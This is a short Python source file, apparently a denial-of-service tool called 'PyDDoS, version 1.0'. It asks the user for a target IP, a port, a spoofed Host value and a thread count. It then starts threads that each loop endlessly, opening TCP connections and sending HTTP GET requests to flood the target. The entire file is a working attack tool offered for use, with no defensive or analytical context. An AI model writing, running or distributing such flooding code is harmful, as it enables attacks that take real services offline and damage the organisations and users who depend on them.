import socket
import threading

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, int(port)))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, int(port)))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, int(port)))
        s.close()

print("PyDDoS, version 1.0")
print("Copyright (c) 2020 miniprime1\n")

fake_ip = input("Enter Fake IP: ")
target = input("Enter Target IP: ")
port = input("Enter Target Port: ")
at_num = input("\nEnter The Number of Thread: ")

for i in range(int(at_num)):
    thread = threading.Thread(target=attack)
    thread.start()

print("Attacking...")